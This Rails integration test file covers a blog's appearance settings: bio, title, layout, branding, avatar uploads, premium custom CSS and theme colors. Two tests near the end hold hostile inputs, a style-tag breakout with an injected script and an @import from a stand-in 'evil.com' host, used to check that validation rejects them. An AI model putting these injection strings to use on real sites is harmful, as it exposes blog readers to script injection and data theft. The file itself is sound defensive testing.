require "test_helper"

class App::Settings::AppearanceControllerTest < ActionDispatch::IntegrationTest
  include AuthenticatedTest

  setup do
    @user = users(:joel)
    @blog = @user.blog
    login_as @user
  end

  test "should get index" do
    get app_settings_appearance_index_url

    assert_select "h3", { count: 1, text: "Bio" }
    assert_select "h3", { count: 1, text: "Title" }
    assert_select "h3", { count: 1, text: "Layout" }
    assert_response :success
  end

  test "should show avatar section if subscribed" do
    get app_settings_appearance_index_url

    assert_select "h3", { count: 1, text: "Avatar" }
    assert_response :success
  end

  test "should disable avatar section if not subscribed and not on trial" do
    login_as users(:vivian)

    get app_settings_appearance_index_url

    assert_select "h3", { count: 1, text: "Avatar" }
    assert_select ".opacity-50.pointer-events-none", count: 1
    assert_response :success
  end

  test "should update blog bio" do
    patch app_settings_appearance_url(@blog), params: { blog: { bio: "New bio" } }, as: :turbo_stream

    assert_redirected_to app_settings_url
    assert_equal "New bio", @blog.reload.bio.to_plain_text
  end

  test "should update blog title" do
    patch app_settings_appearance_url(@blog), params: { blog: { title: "New Title" } }, as: :turbo_stream

    assert_redirected_to app_settings_url
    assert_equal "New Title", @blog.reload.title
  end

  test "should update blog layout" do
    patch app_settings_appearance_url(@blog), params: { blog: { layout: "title_layout" } }, as: :turbo_stream

    assert_redirected_to app_settings_url
    assert_equal "title_layout", @blog.reload.layout
  end

  test "should update show branding flag for subscriber" do
    patch app_settings_appearance_url(@blog), params: { blog: { show_branding: false } }, as: :turbo_stream

    assert_redirected_to app_settings_url
    assert_not @blog.reload.show_branding
    assert_select "input#blog_show_branding[checked]", false
  end

  test "should not update show branding flag for non-subscriber" do
    @user = users(:vivian)
    login_as @user
    @blog = @user.blog

    patch app_settings_appearance_url(@blog), params: { blog: { show_branding: false } }, as: :turbo_stream

    assert_redirected_to app_settings_url
    assert @blog.reload.show_branding
    assert_select "input#blog_show_branding", false
  end

  test "should update avatar if subscribed" do
    file = fixture_file_upload("avatar.png", "image/png")
    patch app_settings_appearance_url(@blog), params: { blog: { avatar: file } }, as: :turbo_stream

    assert_redirected_to app_settings_url
    assert @blog.reload.avatar.attached?
  end

  test "should not update avatar if not subscribed" do
    login_as users(:vivian)
    non_subscribed_blog = users(:vivian).blog

    file = fixture_file_upload("avatar.png", "image/png")
    patch app_settings_appearance_url(non_subscribed_blog), params: { blog: { avatar: file } }, as: :turbo_stream

    assert_redirected_to app_settings_url
    assert_not non_subscribed_blog.reload.avatar.attached?
  end

  test "should show custom css section if user has premium access" do
    get app_settings_appearance_index_url

    assert_select "h3", { count: 1, text: "Custom CSS" }
    assert_select "textarea#blog_custom_css"
    assert_response :success
  end

  test "should not show custom css section if user does not have premium access" do
    login_as users(:vivian)

    get app_settings_appearance_index_url

    assert_select "h3", { count: 0, text: "Custom CSS" }
    assert_select "textarea#blog_custom_css", false
    assert_response :success
  end

  test "should update custom_css if user has premium access" do
    custom_css = ".blog { background: red; }"

    patch app_settings_appearance_url(@blog), params: { blog: { custom_css: custom_css } }, as: :turbo_stream

    assert_redirected_to app_settings_url
    assert_equal custom_css, @blog.reload.custom_css
  end

  test "should not update custom_css if user does not have premium access" do
    login_as users(:vivian)
    vivian_blog = users(:vivian).blog
    custom_css = ".blog { background: red; }"

    patch app_settings_appearance_url(vivian_blog), params: { blog: { custom_css: custom_css } }, as: :turbo_stream

    assert_redirected_to app_settings_url
    assert_nil vivian_blog.reload.custom_css
  end

  test "should show validation error for malicious custom css" do
    malicious_css = ".blog { color: red; }</style><script>alert(1)</script>"

    patch app_settings_appearance_url(@blog), params: { blog: { custom_css: malicious_css } }, as: :turbo_stream

    assert_response :unprocessable_entity
    assert_select ".field-error", text: /contains invalid or potentially unsafe content/
  end

  test "should show validation error for invalid @import" do
    invalid_css = '@import url("https://evil.com/steal.css");'

    patch app_settings_appearance_url(@blog), params: { blog: { custom_css: invalid_css } }, as: :turbo_stream

    assert_response :unprocessable_entity
    assert_select ".field-error", text: /contains invalid or potentially unsafe content/
  end

  test "should update custom theme colors" do
    patch app_settings_appearance_url(@blog), params: {
      blog: {
        custom_theme_bg_light: "#111111",
        custom_theme_text_light: "#222222",
        custom_theme_accent_light: "#333333",
        custom_theme_bg_dark: "#444444",
        custom_theme_text_dark: "#555555",
        custom_theme_accent_dark: "#666666"
      }
    }, as: :turbo_stream

    assert_redirected_to app_settings_url
    @blog.reload
    assert_equal "#111111", @blog.custom_theme_bg_light
    assert_equal "#222222", @blog.custom_theme_text_light
    assert_equal "#333333", @blog.custom_theme_accent_light
    assert_equal "#444444", @blog.custom_theme_bg_dark
    assert_equal "#555555", @blog.custom_theme_text_dark
    assert_equal "#666666", @blog.custom_theme_accent_dark
  end
end
